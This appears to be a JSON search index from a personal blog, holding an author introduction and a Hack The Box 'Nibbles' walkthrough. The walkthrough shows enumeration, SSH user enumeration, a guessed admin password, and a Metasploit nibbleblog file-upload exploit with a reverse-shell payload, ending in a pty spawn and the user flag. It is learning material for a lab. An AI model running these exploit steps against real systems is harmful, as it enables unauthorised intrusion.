[{"content":"Categories:\n","date":"4 February 2023","permalink":"/posts/","section":"Blog","summary":"Categories:","title":"Blog"},{"content":"","date":"4 February 2023","permalink":"/tags/easy/","section":"Tags","summary":"","title":"easy"},{"content":"","date":"4 February 2023","permalink":"/posts/htb/","section":"Blog","summary":"","title":"Hack the box"},{"content":"","date":"4 February 2023","permalink":"/tags/htb/","section":"Tags","summary":"","title":"htb"},{"content":"","date":"4 February 2023","permalink":"/","section":"jose@simon:~","summary":"","title":"jose@simon:~"},{"content":"Intro\u003e\rIntro I have to say that IT sec is not my strong. That\u0026rsquo;s the reason I wanted to approach this matter a few months ago. I have been doing some Hack The Box modules and then, I felt capable to face some of the easiest machines in the platform. I manage to do through some of them with not too many complications but I had to stop because of other projects that required my time.\nI\u0026rsquo;ll be uploading here the few walkthroughs I documented but I will continue with new machines soon.\nThis walkthrougs are a complete process of the steps that I took to reach the flags. Some of them are wrong until I found the right path. I like to have everything documented to learn from my mistakes.\nFirst network enumartion\u003e\rFirst network enumartion First ping the target to check its reachable.\n-[~]$ ping 10.10.10.75 PING 10.10.10.75 (10.10.10.75) 56(84) bytes of data. 64 bytes from 10.10.10.75: icmp_seq=1 ttl=63 time=48.3 ms 64 bytes from 10.10.10.75: icmp_seq=2 ttl=63 time=47.2 ms 64 bytes from 10.10.10.75: icmp_seq=3 ttl=63 time=48.6 ms 64 bytes from 10.10.10.75: icmp_seq=4 ttl=63 time=46.2 ms Scan with nmap\u003e\rScan with nmap Command used:\nnmap -sC -sV -p- 10.10.10.75 Result:\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-05-18 22:17 CEST Nmap scan report for 10.10.10.75 Host is up (0.063s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c4:f8:ad:e8:f8:04:77ðŸ‡©ðŸ‡ªcf:15:0d:63:0a:18:7e:49 (RSA) | 256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA) |_ 256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Site doesn\u0026#39;t have a title (text/html). |_http-server-header: Apache/2.4.18 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 27.60 seconds We can see its using ssh (port 22) It has an apache server (v 2.4.18) runnin (port 80) Directory enumeration\u003e\rDirectory enumeration Command used:\ngobuster dir -u 10.10.10.75 -w /usr/share/dirb/wordlists/common.txt Result:\n/.hta (Status: 403) [Size: 290] /.htpasswd (Status: 403) [Size: 295] /.htaccess (Status: 403) [Size: 295] /index.html (Status: 200) [Size: 93] /server-status (Status: 403) [Size: 299] The directory enumeration showed nothing relevant. Subdomain enumeration\u003e\rSubdomain enumeration I tried a subdomain enumeration with the following command:\ngobuster dns -d 10.10.10.75 -w /usr/share/SecLists/Discovery/DNS/namelist.txt It was taking too much time so I deciede to try an exploitation with the info I had at that moment. You can see it in the first exploitation try section.\nFirst exploitation try\u003e\rFirst exploitation try I tried this exploitation with the info I gathered with the first network enumeration.\nExploit for OpenSSH 7.2p2**\u003e\rExploit for OpenSSH 7.2p2** With a quick research I found the next exploit:\nOpenSSH 7.2p2 - Username Enumeration -\u0026gt; https://www.exploit-db.com/exploits/40136 So with the name I try to find. Easy to find with \u0026ldquo;searchsploit\u0026rdquo;\n-[~]$ searchsploit OpenSSH 7.2p2 Username Enumeration ------------------------------------------------------------------------------------------------------------------------------------------------------------ --------------------------------- Exploit Title | Path ------------------------------------------------------------------------------------------------------------------------------------------------------------ --------------------------------- OpenSSH 2.3 \u0026lt; 7.7 - Username Enumeration | linux/remote/45233.py OpenSSH 2.3 \u0026lt; 7.7 - Username Enumeration (PoC) | linux/remote/45210.py OpenSSH 7.2p2 - Username Enumeration | linux/remote/40136.py OpenSSHd 7.2p2 - Username Enumeration This is the only option I find in msfconsole:\nauxiliary/scanner/ssh/ssh_enumusers normal No SSH Username Enumeration I configured it against the target to see if it\u0026rsquo;s the same one. Need to set up the option RHOSTS of and the USER_FILE with a common top user names file and then run the script with the following output:\n[msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_enumusers) \u0026gt;\u0026gt; set RHOSTS 10.10.10.75 RHOSTS =\u0026gt; 10.10.10.75 [msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_enumusers) \u0026gt;\u0026gt; set USER_FILE /home/jasim/SecLists/Usernames/top-usernames-shortlist.txt USER_FILE =\u0026gt; /home/jasim/SecLists/Usernames/top-usernames-shortlist.txt [msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_enumusers) \u0026gt;\u0026gt; exploit [*] 10.10.10.75:22 - SSH - Using malformed packet technique [*] 10.10.10.75:22 - SSH - Starting scan [+] 10.10.10.75:22 - SSH - User \u0026#39;root\u0026#39; found [+] 10.10.10.75:22 - SSH - User \u0026#39;mysql\u0026#39; found [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed The exploit worked well and gave me some information. As we can see there are two names found for ssh:\nroot -\u0026gt; require password mysql -\u0026gt; require password It\u0026rsquo;s a good info but I decided to continue with the network enumeration to see If I can gather some more useful information.\nSecond network enumeration\u003e\rSecond network enumeration Navigating to the adress of the machine we can see a website with just a hello world message but if we inspect the code we can see an interesting comment.\nScanning subdirectories\u003e\rScanning subdirectories Navigating to the new subdirectory we can see a blog website. So I try to enumerate again this new site.\nCommand:\ngobuster dir -u 10.10.10.75/nibbleblog -w /usr/share/dirb/wordlists/common.txt Result:\n/.hta (Status: 403) [Size: 301] /.htpasswd (Status: 403) [Size: 306] /admin (Status: 301) [Size: 321] [--\u0026gt; http://10.10.10.75/nibbleblog/admin/] /admin.php (Status: 200) [Size: 1401] /.htaccess (Status: 403) [Size: 306] /content (Status: 301) [Size: 323] [--\u0026gt; http://10.10.10.75/nibbleblog/content/] /index.php (Status: 200) [Size: 2987] /languages (Status: 301) [Size: 325] [--\u0026gt; http://10.10.10.75/nibbleblog/languages/] /plugins (Status: 301) [Size: 323] [--\u0026gt; http://10.10.10.75/nibbleblog/plugins/] /README (Status: 200) [Size: 4628] /themes (Status: 301) [Size: 322] [--\u0026gt; http://10.10.10.75/nibbleblog/themes/] Unlike the other time we can see many interesting files so I start check them out.\nREADME -\u0026gt; Info about nibbleblog. Version 4.0.3 admin.php -\u0026gt; Log in for admins Trying to access to another subdirectory with a 301 status code I discover that I can access to the file system so I access to /admin and start checking the files in the server:\nInfo obtained:\nnibbleblog/content/private/config.xml -\u0026gt; an email admin@nibbles.com /nibbleblog/content/private/users.xml -\u0026gt; a username admin With the username I try to login in the admin.php page and after some random tries I manage to enter with the password nibbles\nWith this info I try another exploitation -\u0026gt; [[Second exploitation try]]\nSecond exploitation try\u003e\rSecond exploitation try Looking for an exploit for nibbleblog I found this one with msfconsole:\nexploit/multi/http/nibbleblog_file_upload So I start configuring it. It must have the RHOST, USERNAME and PASSWORD options set. As I have this info I set them.\n[msf](Jobs:0 Agents:0) exploit(multi/http/nibbleblog_file_upload) \u0026gt;\u0026gt; set RHOSTS 10.10.10.75 RHOSTS =\u0026gt; 10.10.10.75 [msf](Jobs:0 Agents:0) exploit(multi/http/nibbleblog_file_upload) \u0026gt;\u0026gt; set LHOST 10.10.16.3 LHOST =\u0026gt; 10.10.16.3 [msf](Jobs:0 Agents:0) exploit(multi/http/nibbleblog_file_upload) \u0026gt;\u0026gt; set USERNAME admin USERNAME =\u0026gt; admin [msf](Jobs:0 Agents:0) exploit(multi/http/nibbleblog_file_upload) \u0026gt;\u0026gt; set PASSWORD nibbles PASSWORD =\u0026gt; nibbles Need to change the TARGETURI option too because the default one is not correct:\n[msf](Jobs:0 Agents:0) exploit(multi/http/nibbleblog_file_upload) \u0026gt;\u0026gt; set TARGETURI /nibbleblog TARGETURI =\u0026gt; /nibbleblog [msf](Jobs:0 Agents:0) exploit(multi/http/nibbleblog_file_upload) \u0026gt;\u0026gt; check [*] 10.10.10.75:80 - The target appears to be vulnerable. I also change the payload to get a reverse shell to the target.\n[msf](Jobs:0 Agents:0) exploit(multi/http/nibbleblog_file_upload) \u0026gt;\u0026gt; set payload generic/shell_reverse_tcp payload =\u0026gt; generic/shell_reverse_tcp If we run the script we will have access to the targe through the rever shell. First, this is to get a tty terminal so let\u0026rsquo;s use the next command for it:\npython3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; Now we can navigate in the system to the user folder and get the flag:\nnibbler@Nibbles:/home/nibbler$ ls ls personal.zip user.txt nibbler@Nibbles:/home/nibbler$ cat user.txt cat user.txt bff9c2b0ddccc2151f6cd15ca4055158 ","date":"4 February 2023","permalink":"/posts/htb/nibbles/","section":"Blog","summary":"Walkthrough of the Nibbles easy machine from Hack The Box","title":"Nibbles"},{"content":"","date":"4 February 2023","permalink":"/tags/security/","section":"Tags","summary":"","title":"security"},{"content":"","date":"4 February 2023","permalink":"/tags/","section":"Tags","summary":"","title":"Tags"},{"content":"","date":"2 February 2023","permalink":"/tags/personal/","section":"Tags","summary":"","title":"personal"},{"content":"","date":"2 February 2023","permalink":"/posts/personal/","section":"Blog","summary":"","title":"Personal"},{"content":"Welcome to my blog!\u003e\rWelcome to my blog! Why the blog?\u003e\rWhy the blog? I was going through my old GitHub repository from when I was a student, and I saw my old Hugo blog that I used to take notes. I remembered that writing my thoughts and trying to explain the things I was studying was a very effective way to understand and reinforce what has been learned. So I decided to make another blog in a more proffesional way. After all, in the IT world you never stop studying.\nAbout me\u003e\rAbout me But let me introduce myself a little bit. My name is Jose. I\u0026rsquo;m a 30 years old developer based in Spain. I live in a small village with my dog Kira. I moved here to avoid the mess of the big cities.\nWalking in nature is one of the things that relax me the most when I\u0026rsquo;m stressed or blocked by some problem. Sometimes, walking between the olive trees makes me think more clearly.\nAbout my hobbies, I read a lot, mostly historical or science fiction novels. Could be unnecessary to say that I spend much time researching and studying new IT things. Sometimes I try to encompass too many projects and activities so I try to manage my time the best I can.\nMy work\u003e\rMy work I\u0026rsquo;ve been working in IT since 2014, but not always as a software developer. I began working as an IT technician, where my job was mainly fixing computers and installing and configuring networks. It was at that time that I discover my passion for this world.\nAlways that I have a chance I have to thank my teachers from the IES Severo Ochoa in Elche and the IES Saladillo in Algeciras. Their professionalism and their awesome way to teach are one of the reasons why I chose this path.\nI\u0026rsquo;ve been coding for 5 years ago and working as a full-stack developer for the last 3.\nWhat now?\u003e\rWhat now? The more I learn, the more I notice the little I know. So I decided to take another step in my studies. I began a college career in software engineering and I\u0026rsquo;m working on a personal project with React Native that I would like to have ready in the next months. Well, I think this is enought for a presentation. Although it\u0026rsquo;s a personal blog, I hope you could find some useful or curious information.\nThanks for reading. See you in the next post!!\n","date":"2 February 2023","permalink":"/posts/personal/presentation/","section":"Blog","summary":"This is my first post in the blog. Here you will find some info about what to expect of this site.","title":"Presentation"},{"content":"","date":"1 January 0001","permalink":"/authors/","section":"Authors","summary":"","title":"Authors"},{"content":"","date":"1 January 0001","permalink":"/categories/","section":"Categories","summary":"","title":"Categories"},{"content":"","date":"1 January 0001","permalink":"/posts/coding/","section":"Blog","summary":"","title":"Coding"},{"content":"","date":"1 January 0001","permalink":"/series/","section":"Series","summary":"","title":"Series"}]